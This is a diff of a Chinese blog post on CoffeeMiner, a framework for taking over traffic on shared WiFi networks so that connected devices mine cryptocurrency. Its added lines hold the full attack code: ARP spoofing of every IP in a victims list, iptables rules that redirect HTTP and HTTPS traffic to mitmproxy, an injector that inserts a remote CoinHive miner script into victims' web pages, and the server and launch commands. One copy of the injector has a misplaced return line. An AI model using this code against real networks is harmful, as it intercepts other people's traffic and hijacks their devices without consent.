@@ -1,6 +1,8 @@
 ---
 title: CoffeeMiner：劫持WiFi网络接入设备进行“挖矿”的框架
 date: 2018/1/31 21:25:20
+updated: 2018/1/31 21:25:20
+toc: true
 categories:
 - 网络安全
 tags:
@@ -70,45 +72,49 @@ mitmproxy是一款流量分析和编辑工具，可以用它来发起中间人�
 ## Injector
 一旦我们截获了受害者的网络流量之后，就可在其中注入我们构造的脚本，为了实现脚本注入，我们需要用到 mitmproxy API 来编写相应injector代码：
 
-    from bs4 import BeautifulSoup
-    from mitmproxy import ctx, http
-    import argparse
-    class Injector:
-        def __init__(self, path):
-            self.path = path
-        def response(self, flow: http.HTTPFlow) -> None:
-            if self.path:
-                html = BeautifulSoup(flow.response.content, "html.parser")
-                print(self.path)
-                print(flow.response.headers["content-type"])
-                if flow.response.headers["content-type"] == 'text/html':
-                    script = html.new_tag(
-                        "script",
-                        src=self.path,
-                        type='application/javascript')
-                    html.body.insert(0, script)
-                    flow.response.content = str(html).encode("utf8")
-                    print("Script injected.")
-    def start():
-        parser = argparse.ArgumentParser()
-        parser.add_argument("path", type=str)
-        args = parser.parse_args()
-    return Injector(args.path)
+{% codeblock lang:python %}
+from bs4 import BeautifulSoup
+from mitmproxy import ctx, http
+import argparse
+class Injector:
+    def __init__(self, path):
+        self.path = path
+    def response(self, flow: http.HTTPFlow) -> None:
+        if self.path:
+            html = BeautifulSoup(flow.response.content, "html.parser")
+            print(self.path)
+            print(flow.response.headers["content-type"])
+            if flow.response.headers["content-type"] == 'text/html':
+                script = html.new_tag(
+                    "script",
+                    src=self.path,
+                    type='application/javascript')
+                html.body.insert(0, script)
+                flow.response.content = str(html).encode("utf8")
+                print("Script injected.")
+def start():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("path", type=str)
+    args = parser.parse_args()
+return Injector(args.path)
+{% endcodeblock %}
 
 ## HTTP Server
 如前所述，当injector向html页面中添加了一行代码后，就会调用JavaScript挖矿脚本，所以，需要在HTTP服务器中部署该脚本文件。而为了实现该脚本的请求调用，须在测试者电脑中部署一个HTTP服务器，为此，我们要用到Python的‘http.server’库功能：
 
-    #!/usr/bin/env python
-    import http.server
-    import socketserver
-    import os
-    PORT = 8000
-    web_dir = os.path.join(os.path.dirname(__file__), 'miner_script')
-    os.chdir(web_dir)
-    Handler = http.server.SimpleHTTPRequestHandler
-    httpd = socketserver.TCPServer(("", PORT), Handler)
-    print("serving at port", PORT)
-    httpd.serve_forever()
+{% codeblock lang:python %}
+#!/usr/bin/env python
+import http.server
+import socketserver
+import os
+PORT = 8000
+web_dir = os.path.join(os.path.dirname(__file__), 'miner_script')
+os.chdir(web_dir)
+Handler = http.server.SimpleHTTPRequestHandler
+httpd = socketserver.TCPServer(("", PORT), Handler)
+print("serving at port", PORT)
+httpd.serve_forever()
+{% endcodeblock %}
 
 上面的代码就是一个托管挖矿服务的简单HTTP服务器，其中托管脚本会被放置在/miner_script目录下，为了实现真正的挖矿，我在此使用了CoinHive的JavaScript挖矿平台工具。
 
@@ -127,17 +133,19 @@ CoffeeMiner脚本会执行ARP欺骗，并能用mitmproxy将CoinHive 挖矿程序
 
 为了对所有受害者执行ARP欺骗，我会使用一些Python代码来读取所有受害者IP，并用一个名为‘victims.txt’的文件来存储这些IP，之后再对这些IP执行ARP欺骗：
 
-    #get gateway_ip
-    gateway = sys.argv[1]
-    print("gateway: " + gateway)
-    #get victims_ip
-    victims = [line.rstrip('\n') for line in open("victims.txt")]
-    print("victims:")
-    print(victims)
-    #run the arpspoof for each victim, each one in a new console
-    for victim in victims:
-        os.system("xterm -e arpspoof -i eth0 -t " + victim + " " + gateway + " &")
-        os.system("xterm -e arpspoof -i eth0 -t " + gateway + " " + victim + " &")
+{% codeblock lang:python %}
+#get gateway_ip
+gateway = sys.argv[1]
+print("gateway: " + gateway)
+#get victims_ip
+victims = [line.rstrip('\n') for line in open("victims.txt")]
+print("victims:")
+print(victims)
+#run the arpspoof for each victim, each one in a new console
+for victim in victims:
+    os.system("xterm -e arpspoof -i eth0 -t " + victim + " " + gateway + " &")
+    os.system("xterm -e arpspoof -i eth0 -t " + gateway + " " + victim + " &")
+{% endcodeblock %}
 
 一旦ARP欺骗操作发起后，运行HTTP服务器即可：
 >python3 httpServer.py
@@ -146,58 +154,59 @@ CoffeeMiner脚本会执行ARP欺骗，并能用mitmproxy将CoinHive 挖矿程序
 >mitmdump -s 'injector.py http://httpserverIP:8000/script.js'
 
 ## 最终脚本
-**coffeeMiner.py：**
 
-    import os
-    import sys
-    #get gateway_ip (router)
-    gateway = sys.argv[1]
-    print("gateway: " + gateway)
-    #get victims_ip
-    victims = [line.rstrip('\n') for line in open("victims.txt")]
-    print("victims:")
-    print(victims)
-    #configure routing (IPTABLES)
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-    os.system("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
-    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
-    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
-    #run the arpspoof for each victim, each one in a new console
-    for victim in victims:
-        os.system("xterm -e arpspoof -i eth0 -t " + victim + " " + gateway + " &")
-        os.system("xterm -e arpspoof -i eth0 -t " + gateway + " " + victim + " &")
-    #start the http server for serving the script.js, in a new console
-    os.system("xterm -hold -e 'python3 httpServer.py' &")
-    #start the mitmproxy
-    os.system("~/.local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T")
-    
-**injector.py：**
+{% codeblock coffeeMiner.py lang:python %}
+import os
+import sys
+#get gateway_ip (router)
+gateway = sys.argv[1]
+print("gateway: " + gateway)
+#get victims_ip
+victims = [line.rstrip('\n') for line in open("victims.txt")]
+print("victims:")
+print(victims)
+#configure routing (IPTABLES)
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+os.system("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
+os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
+#run the arpspoof for each victim, each one in a new console
+for victim in victims:
+    os.system("xterm -e arpspoof -i eth0 -t " + victim + " " + gateway + " &")
+    os.system("xterm -e arpspoof -i eth0 -t " + gateway + " " + victim + " &")
+#start the http server for serving the script.js, in a new console
+os.system("xterm -hold -e 'python3 httpServer.py' &")
+#start the mitmproxy
+os.system("~/.local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T")
+{% endcodeblock %}
 
-    from bs4 import BeautifulSoup
-    from mitmproxy import ctx, http
-    import argparse
-    class Injector:
-        def __init__(self, path):
-            self.path = path
-        def response(self, flow: http.HTTPFlow) -> None:
-            if self.path:
-                html = BeautifulSoup(flow.response.content, "html.parser")
-                print(self.path)
+{% codeblock injector.py lang:python %}
+from bs4 import BeautifulSoup
+from mitmproxy import ctx, http
+import argparse
+class Injector:
+    def __init__(self, path):
+        self.path = path
+    def response(self, flow: http.HTTPFlow) -> None:
+        if self.path:
+            html = BeautifulSoup(flow.response.content, "html.parser")
+            print(self.path)
+            print(flow.response.headers["content-type"])
+            if flow.response.headers["content-type"] == 'text/html':
                 print(flow.response.headers["content-type"])
-                if flow.response.headers["content-type"] == 'text/html':
-                    print(flow.response.headers["content-type"])
-                    script = html.new_tag(
-                        "script",
-                        src=self.path,
-                        type='application/javascript')
-                    html.body.insert(0, script)
-                    flow.response.content = str(html).encode("utf8")
-                    print("Script injected.")
-    def start():
-        parser = argparse.ArgumentParser()
-        parser.add_argument("path", type=str)
-        args = parser.parse_args()
-        return Injector(args.path)
+                script = html.new_tag(
+                    "script",
+                    src=self.path,
+                    type='application/javascript')
+                html.body.insert(0, script)
+                flow.response.content = str(html).encode("utf8")
+                print("Script injected.")
+def start():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("path", type=str)
+    args = parser.parse_args()
+    return Injector(args.path)
+{% endcodeblock %}
 
 ## 测试执行操作：
 >python3 coffeeMiner.py RouterIP
